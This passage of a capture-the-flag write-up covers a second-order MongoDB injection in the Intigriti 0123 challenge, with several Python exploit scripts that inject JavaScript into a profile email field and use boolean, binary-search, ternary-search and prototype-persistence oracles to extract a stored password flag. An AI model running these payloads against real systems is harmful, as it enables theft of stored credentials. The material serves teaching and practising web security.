    <span class="token string">"password"</span><span class="token punctuation">:</span> name
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span> <span class="token keyword">or</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'[]\n'</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>

  <span class="token keyword">return</span> char

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag"</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">"INTIGRITI&#123;"</span>
current <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
  should_break <span class="token operator">=</span> <span class="token boolean">False</span>
  <span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
      futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_flag<span class="token punctuation">,</span> current<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span> c <span class="token keyword">for</span> c <span class="token keyword">in</span> charset<span class="token punctuation">&#125;</span>
      <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
          index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
          data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token keyword">if</span> data <span class="token operator">!=</span> <span class="token boolean">False</span> <span class="token keyword">and</span> <span class="token keyword">not</span> should_break<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> data
            should_break <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
  current <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/intigriti-0123-second-order-injection/p2.png" alt="leak char by char"></p>
<p>It takes around 10~15s to leak one character.</p>
<p>Can we go faster? Sure!</p>
<h2><span id="binary-search-to-the-rescue">Binary search to the rescue</span></h2><p>It’s boolean-based injection, the result is either found or not found, we can apply binary search to make it way faster.</p>
<p>It’s easier to use char code to do the binary search. Also, I assumed that we know the length of flag beforehand because it’s easier(we can still leak the length first in practical but I am lazy to implement it)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

req_count <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">def</span> <span class="token function">leak_flag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  name <span class="token operator">=</span> <span class="token string">'account_flag_'</span>  <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> name
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  req_count <span class="token operator">+=</span> <span class="token number">1</span>

  L <span class="token operator">=</span> <span class="token number">33</span>
  R <span class="token operator">=</span> <span class="token number">126</span>
  linear_mode <span class="token operator">=</span> <span class="token boolean">False</span>
  <span class="token keyword">while</span> R<span class="token operator">>=</span>L<span class="token punctuation">:</span>
    M <span class="token operator">=</span> <span class="token punctuation">(</span>L<span class="token operator">+</span>R<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") &amp;&amp; this.password.charCodeAt(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">) >= </span><span class="token interpolation"><span class="token punctuation">&#123;</span>M<span class="token punctuation">&#125;</span></span><span class="token string"> ) &amp;&amp; "" == "'</span></span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Try leaking flag[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">], range is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>L<span class="token punctuation">&#125;</span></span><span class="token string"> to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>R<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>R <span class="token operator">-</span> L <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      linear_mode <span class="token operator">=</span> <span class="token boolean">True</span>
      payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'not@not_exist.ext" || (this.password.startsWith("INTIGRITI") &amp;&amp; this.password.charCodeAt(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">) === </span><span class="token interpolation"><span class="token punctuation">&#123;</span>L<span class="token punctuation">&#125;</span></span><span class="token string">  ) &amp;&amp; "" == "'</span></span>
    
    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
      <span class="token string">"email"</span><span class="token punctuation">:</span> payload
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
    req_count <span class="token operator">+=</span> <span class="token number">2</span>
    <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span> <span class="token keyword">or</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span> <span class="token keyword">or</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'[]\n'</span><span class="token punctuation">:</span>
      <span class="token keyword">if</span> linear_mode<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>L<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
      R <span class="token operator">=</span> M <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">if</span> linear_mode<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span>
      L <span class="token operator">=</span> M

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag..."</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token number">19</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_flag<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        flag<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_count<span class="token punctuation">&#125;</span></span><span class="token string"> requests"</span></span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/intigriti-0123-second-order-injection/p3.png" alt="binary search"></p>
<p>It takes 10s and 291 requests. It can be further improved if we ignore the prefix(<code>INTIGRITI&#123;</code>).</p>
<p>Is it the end? Can we go faster? Yes!</p>
<h2><span id="from-binary-search-to-ternary-search">From binary search to ternary search</span></h2><p>Actually, we can have 3 states. When we do something illegal (like using a undeclared variable), the server returns 500 internal error.</p>
<p>By leveraging this error state, we can do ternary search!</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>
FLAG_CHARSET <span class="token operator">=</span> string<span class="token punctuation">.</span>printable

req_count <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">def</span> <span class="token function">leak_flag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  name <span class="token operator">=</span> <span class="token string">'account_flag_'</span>  <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> name
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  req_count <span class="token operator">+=</span> <span class="token number">1</span>

  L <span class="token operator">=</span> <span class="token number">0</span>
  R <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>FLAG_CHARSET<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
  <span class="token keyword">while</span> L<span class="token operator">&lt;=</span>R<span class="token punctuation">:</span>
    s <span class="token operator">=</span> <span class="token punctuation">(</span>R<span class="token operator">-</span>L<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">3</span>
    ML <span class="token operator">=</span> L <span class="token operator">+</span> s
    MR <span class="token operator">=</span> L <span class="token operator">+</span> s <span class="token operator">*</span> <span class="token number">2</span>
    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      MR <span class="token operator">=</span> L <span class="token operator">+</span> <span class="token number">1</span>

    group <span class="token operator">=</span> <span class="token punctuation">[</span>
      FLAG_CHARSET<span class="token punctuation">[</span>L<span class="token punctuation">:</span>ML<span class="token punctuation">]</span><span class="token punctuation">,</span>
      FLAG_CHARSET<span class="token punctuation">[</span>ML<span class="token punctuation">:</span>MR<span class="token punctuation">]</span><span class="token punctuation">,</span>
      FLAG_CHARSET<span class="token punctuation">[</span>MR<span class="token punctuation">:</span>R<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span>

    str1 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\\"'</span><span class="token punctuation">)</span>
    str2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\\"'</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'not@not_exist.ext" || this.password.startsWith("INTIGRITI") &amp;&amp; ("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>str1<span class="token punctuation">&#125;</span></span><span class="token string">".includes(this.password[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]) ? a : ("</span><span class="token interpolation"><span class="token punctuation">&#123;</span>str2<span class="token punctuation">&#125;</span></span><span class="token string">".includes(this.password[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]) ? 0 : 1)) &amp;&amp; "" == "'</span></span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"try leaking </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> group<span class="token punctuation">)</span>

    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
      <span class="token string">"email"</span><span class="token punctuation">:</span> payload
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
    req_count <span class="token operator">+=</span> <span class="token number">2</span>

    <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
      R <span class="token operator">=</span> ML
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">elif</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
      L <span class="token operator">=</span> ML
      R <span class="token operator">=</span> MR
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      L <span class="token operator">=</span> MR
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> group<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking flag..."</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token number">19</span>
flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
<span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>leak_flag<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
        index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
        data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
        flag<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_count<span class="token punctuation">&#125;</span></span><span class="token string"> requests"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/intigriti-0123-second-order-injection/p4.png" alt="ternary search"></p>
<p>It takes 7s(-30%) and 185 requests(-36%).</p>
<p>Can we go faster? Probably, I am looking forward to seeing a faster solution. Can we reduce the request? Absolutely!</p>
<p>Since <a target="_blank" rel="noopener" href="https://www.mongodb.com/docs/v4.2/reference/method/sleep/">sleep function</a> is enabled, we can use it to introduce more states, and leak the flag in less requests theoretically, but need to wait much longer.</p>
<h2><span id="a-faster-solution">A faster solution</span></h2><p>After this writeup has been published, @antonio345 reach me on Discord, saying that he has an idea to make it faster.</p>
<p>The idea is to “persist” the flag, here is one example:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>email <span class="token operator">===</span> <span class="token string">"anything@anything.com"</span> <span class="token operator">||</span> 
    <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">"PinkDraconian"</span> <span class="token operator">&amp;&amp;</span> 
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>flag<span class="token operator">==</span><span class="token string">"INTIGRITI&#123;Y0uD1d1T&#125;"</span> <span class="token operator">?</span> 
      <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">"username_true"</span> <span class="token operator">:</span> 
      <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">"username_false"</span>
    <span class="token operator">||</span> <span class="token string">""</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When the search function meets <code>PinkDraconian</code>, it will store the password in <code>this.__proto__</code>. Then, we can get this password when this function is processing other accounts.</p>
<p>For above, the return value is <code>username_true</code>, which prove that this works.</p>
<p>I also thought about similar things before, but somehow not success. After having the ability to store the flag, we can reuse the “oracle” to get the flag with less requests:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> json
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time

BASE_URL <span class="token operator">=</span> <span class="token string">'https://challenge-0123.intigriti.io'</span>
LOGIN_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/login.html'</span>
EDIT_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/editor.html'</span>
QUERY_URL <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> <span class="token string">'/api/friends?q='</span>

SKIP_CREATE_ORACLE <span class="token operator">=</span> <span class="token number">0</span>
MAX_WORKERS <span class="token operator">=</span> <span class="token number">15</span>
charset <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
req_count <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">def</span> <span class="token function">create_oracle</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"account_oracle_"</span> <span class="token operator">+</span> c<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">1</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_char</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">global</span> req_count
  payload <span class="token operator">=</span> <span class="token string">'anything@anything.com" || this.username=="PinkDraconian" &amp;&amp; (() => &#123;this.__proto__.flag = this.password;&#125;)() || this.flag &amp;&amp; this.username == "account_oracle_"+this.flag['</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'] || "'</span>
  session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

  name <span class="token operator">=</span> <span class="token string">"account_get_"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>

  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>LOGIN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span> name
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>EDIT_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">"email"</span><span class="token punctuation">:</span> payload
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>QUERY_URL <span class="token operator">+</span> name<span class="token punctuation">)</span>
  req_count<span class="token operator">+=</span><span class="token number">3</span>
  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token keyword">if</span> resp<span class="token punctuation">.</span>text <span class="token operator">==</span> <span class="token string">'null'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Failed'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'#'</span>

  <span class="token comment">#print(resp.text)</span>
